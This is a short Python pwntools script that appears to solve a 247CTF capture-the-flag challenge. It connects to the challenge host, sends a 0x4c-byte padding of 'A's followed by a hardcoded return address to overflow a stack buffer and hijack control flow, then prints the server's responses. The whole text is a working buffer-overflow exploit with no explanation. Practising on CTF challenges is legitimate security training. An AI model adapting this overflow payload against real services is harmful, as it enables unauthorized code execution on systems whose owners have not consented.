from pwn import *

conn = remote("638843e8c543438a.247ctf.com", 50425)
print(conn.recvline())
conn.send(b'A' * 0x4c + b'\x76\x85\x04\x08' + b'\n')
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
conn.close()
